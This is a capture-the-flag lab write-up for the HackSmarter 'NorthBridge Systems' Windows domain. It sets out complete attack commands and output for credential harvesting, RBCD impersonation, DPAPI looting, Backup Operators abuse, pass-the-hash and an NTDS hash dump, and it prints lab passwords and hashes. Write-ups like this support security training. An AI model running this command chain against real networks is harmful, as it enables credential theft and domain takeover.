---
title: "NorthBridge Systems"
platform: "HackSmarter"
category: "Windows"
difficulty: "Hard"
date: 2025-11-21
os: "Windows Server 2022"
tags: ["windows", "active-directory", "rbcd", "dpapi", "backup-operators", "bloodyad", "credential-harvesting", "ntds-dump"]
---

---

## Overview

**Platform:** HackSmarter
**Difficulty:** Hard
**Domain:** northbridge.corp

This is a multi-machine assumed breach engagement consisting of two Windows hosts. Starting with provided service account credentials, the objective is to compromise the domain controller (NORTHDC01).

---

## Scope

```
Host              IP Address      Operating System        Role
─────────────────────────────────────────────────────────────────────
NORTHJMP01        10.1.157.240    Windows Server 2022     Jump Box
NORTHDC01         10.1.190.26     Windows Server 2022     Domain Controller
```

---

## Executive Summary

The engagement identified critical vulnerabilities across both systems:

- **Hardcoded credentials** in network share scripts enabling lateral movement
- **Delegated OU permissions** allowing rogue computer account creation
- **Resource-Based Constrained Delegation (RBCD)** abuse for credential theft
- **DPAPI credential extraction** exposing backup service account
- **Backup Operators abuse** enabling SAM/NTDS extraction

**Risk Rating:** Critical

---

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────┐
│      Starting Creds → SMB Enumeration → Credential Discovery    │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     _svrautomationsvc → BloodyAD → Create Computer Account      │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│          RBCD Attack → S4U2Proxy → secretsdump (JMP01)          │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│      Local Admin (PTH) → DPAPI Dump → _backupsvc Credentials    │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Backup Operators → SAM Dump → Machine Account Hash (DC)     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│             NTDS Dump → Domain Admin Access                     │
└─────────────────────────────────────────────────────────────────┘
```

---

# Phase 1: Enumeration (NORTHJMP01)

## 1.1 Initial Reconnaissance

Starting credentials provided for assumed breach:

```
_securitytestingsvc:4kCc$A@NZvNAdK@
```

Port scanning revealed standard Windows services:

```bash
nmap -sCV 10.1.157.240 -Pn
```

```
Port    Service         Version
────────────────────────────────────────
135     MSRPC           Microsoft Windows RPC
445     SMB             Microsoft-DS
3389    RDP             Microsoft Terminal Services
```

**Domain Information:**
- Domain: `northbridge.corp`
- Computer: `NORTHJMP01.northbridge.corp`

## 1.2 SMB Share Enumeration

Validating credentials and enumerating shares:

```bash
nxc smb 10.1.157.240 -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --shares
```

```
Share           Permissions
─────────────────────────────
ADMIN$          -
C$              -
IPC$            READ
Network Shares  READ
```

Using spider_plus to enumerate share contents:

```bash
nxc smb 10.1.157.240 -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' -M spider_plus -o DOWNLOAD_FLAG=True
```

**Interesting Files Found:**
- `Archive/backup.bat`
- `Security/sm/sam scratchpad.txt`
- `Wintel Engineering/ADCS Review/*`
- `Wintel Engineering/Privileged accounts notes.txt`

## 1.3 Credential Discovery - backup.bat

```bash
cat backup.bat
```

```batch
@echo off
REM === Upload.bat ===
SET PSCP="\\NORTHFILESRV01\Department Shares\IT\Tools\putty\pscp.exe"
SET USER=_backupautomation
SET PASS=1rUlHB95TVA2I&BCve
SET DEST=10.10.99.12
```

**Credentials Found:** `_backupautomation:1rUlHB95TVA2I&BCve`

## 1.4 LDAP User Enumeration

```bash
nxc ldap 10.1.190.26 -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --users
```

Notable accounts discovered:
- PAM-managed accounts (T0/T1/T2 tiering)
- `_backupsvc` - Backup service account
- `_svrautomationsvc` - Server automation service

## 1.5 BloodHound Enumeration

```bash
rusthound-ce -d northbridge.corp -u '_securitytestingsvc@northbridge.corp' \
  -p '4kCc$A@NZvNAdK@' -i 10.1.190.26 -o /workspace/bloodhound_data -c All
```

BloodHound revealed `_svrautomationsvc` has `WriteAccountRestrictions` on NORTHJMP01.

---

# Phase 2: RDP Enumeration & Credential Harvesting

## 2.1 Scripts Discovery via RDP

RDP access revealed a `C:\Scripts` folder containing:
- `AD Domain Backup`
- `Server Build Automation`

## 2.2 Server Build Automation Credentials

The README in Server Build Automation contained:

```
Example usage:
"C:\Scripts\Server Build Automation\ServerBuildAutomation.ps1"
  -DomainName northbridge.local
  -DomainJoinUser _svrautomationsvc
  -DomainJoinPassword yf0@EoWY4cXqmVv
```

**Credentials Found:** `_svrautomationsvc:yf0@EoWY4cXqmVv`

## 2.3 OU Permission Analysis

Examining the PowerShell script revealed the target OU:

```powershell
$OUPath = "OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp"
```

Verifying permissions with dacledit:

```bash
dacledit.py 'northbridge/_securitytestingsvc:4kCc$A@NZvNAdK@' \
  -dc-ip 10.1.190.26 -principal _svrautomationsvc \
  -target-dn 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp' -action read
```

```
[*] ACE Type        : ACCESS_ALLOWED_OBJECT_ACE
[*] Access mask     : CreateChild, DeleteChild (0x3)
[*] Object type     : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
[*] Trustee (SID)   : _svrautomationsvc
```

---

# Phase 3: RBCD Attack

## 3.1 Create Rogue Computer Account

Using BloodyAD to create a computer account in the ServerProvisioning OU:

```bash
bloodyAD -d northbridge.corp -u _svrautomationsvc -p 'yf0@EoWY4cXqmVv' \
  --host northdc01.northbridge.corp add computer \
  --ou 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp' \
  'NORTHTEST' 'NorthbridgeTest2025!!'
```

## 3.2 Configure RBCD Delegation

```bash
bloodyAD -d northbridge.corp -u _svrautomationsvc -p 'yf0@EoWY4cXqmVv' \
  --host northdc01.northbridge.corp add rbcd 'NORTHJMP01$' 'NORTHTEST$'
```

```
[+] NORTHTEST$ can now impersonate users on NORTHJMP01$ via S4U2Proxy
```

## 3.3 S4U2Proxy Impersonation

After testing multiple users, `gcookT1` successfully yielded credentials:

```bash
getST.py -spn 'cifs/NORTHJMP01.northbridge.corp' -impersonate 'gcookT1' \
  -dc-ip 10.1.190.26 northbridge.corp/NORTHTEST$:'NorthbridgeTest2025!!' \
  -force-forwardable
```

```
[+] Saving ticket in gcookT1@cifs_NORTHJMP01.northbridge.corp@NORTHBRIDGE.CORP.ccache
```

## 3.4 Credential Dump via secretsdump

```bash
export KRB5CCNAME=gcookT1@cifs_NORTHJMP01.northbridge.corp@NORTHBRIDGE.CORP.ccache
secretsdump.py -k -no-pass northbridge.corp/gcookT1@NORTHJMP01.northbridge.corp
```

**Local Administrator Hash:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
```

---

# Phase 4: NORTHJMP01 Compromise

## 4.1 Pass-the-Hash Access

```bash
nxc smb 10.1.157.240 -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec --local-auth
```

```
SMB  10.1.157.240  445  NORTHJMP01  [+] NORTHJMP01\Administrator (admin)
```

## 4.2 Evil-WinRM Shell

```bash
evil-winrm -i 10.1.157.240 -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec
```

**User Flag Retrieved!**

## 4.3 DPAPI Credential Extraction

```bash
nxc smb 10.1.157.240 -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec \
  --local-auth --dpapi
```

```
[+] Got 64 decrypted masterkeys. Looting secrets...
[SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{...}
  - NORTHBRIDGE\_backupsvc:j0$QyPZ0JWzN2*iu^5
```

**Critical Credential:** `_backupsvc:j0$QyPZ0JWzN2*iu^5`

---

# Phase 5: Domain Controller Compromise

## 5.1 Backup Operators Abuse

The `_backupsvc` account is a member of Backup Operators, allowing SAM extraction:

```bash
nxc smb 10.1.190.26 -u '_backupsvc' -p 'j0$QyPZ0JWzN2*iu^5' -M backup_operator
```

```
BACKUP_O...  Saved HKLM\SAM to \\10.1.190.26\SYSVOL\SAM
BACKUP_O...  Saved HKLM\SYSTEM to \\10.1.190.26\SYSVOL\SYSTEM
BACKUP_O...  Saved HKLM\SECURITY to \\10.1.190.26\SYSVOL\SECURITY
```

**Machine Account Hash:**
```
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7f49c490a1dc5b36d883147b83992ad6
```

## 5.2 NTDS Dump via Machine Account

Using the DC machine account hash to dump NTDS:

```bash
nxc smb 10.1.190.26 -u 'NORTHDC01$' -H 7f49c490a1dc5b36d883147b83992ad6 --ntds
```

```
[+] Dumping the NTDS, this could take a while...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8b61f9dfb32c8209f4ac9e2a5c2269cc:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:810645bd7aab33e05ff416ea948ccb10:::
[+] Dumped 28 NTDS hashes
```

## 5.3 Domain Admin Access

```bash
evil-winrm -i 10.1.190.26 -u Administrator -H 8b61f9dfb32c8209f4ac9e2a5c2269cc
```

**Root Flag Retrieved!**

---

## Credentials Summary

```
Phase 1-2 - Enumeration & Discovery
────────────────────────────────────────────────────────────────
_securitytestingsvc  : 4kCc$A@NZvNAdK@      → Starting creds
_backupautomation    : 1rUlHB95TVA2I&BCve   → backup.bat
_svrautomationsvc    : yf0@EoWY4cXqmVv      → README script

Phase 3-4 - NORTHJMP01 (10.1.157.240)
────────────────────────────────────────────────────────────────
NORTHTEST$           : NorthbridgeTest2025!! → Rogue computer
Administrator (local): [NTLM Hash PTH]       → RBCD attack
_backupsvc           : j0$QyPZ0JWzN2*iu^5    → DPAPI extraction

Phase 5 - NORTHDC01 (10.1.190.26)
────────────────────────────────────────────────────────────────
NORTHDC01$           : [NTLM Hash]           → Backup Operators
Administrator (DA)   : [NTLM Hash PTH]       → NTDS dump
```

---

## Tools Used

- **Nmap** - Port scanning and service enumeration
- **NetExec (nxc)** - SMB enumeration, spider_plus, DPAPI, backup_operator
- **RustHound-CE** - BloodHound data collection
- **BloodyAD** - Computer account creation and RBCD configuration
- **Impacket** - getST.py, secretsdump.py, dacledit.py
- **Evil-WinRM** - Remote shell access

---

## References

- [HackTricks - RBCD Attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)
- [BloodyAD Documentation](https://github.com/CravateRouge/bloodyAD)
- [Backup Operators Abuse](https://www.hackingarticles.in/windows-privilege-escalation-backup-operators/)
- [DPAPI Secrets Extraction](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
